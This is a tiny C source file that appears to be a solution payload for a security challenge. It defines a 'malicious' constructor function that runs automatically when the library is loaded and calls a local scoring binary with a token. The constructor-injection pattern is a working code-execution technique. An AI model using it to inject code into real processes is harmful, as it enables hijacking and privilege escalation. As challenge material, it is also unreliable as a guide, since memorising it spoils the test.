#include<stdio.h>
#include<stdlib.h>

static void malicious() __attribute__((constructor));

void malicious() {
    system("/usr/local/bin/score ab191c97-1aaa-4b9b-b1c8-c4745cf5c4f0");
}

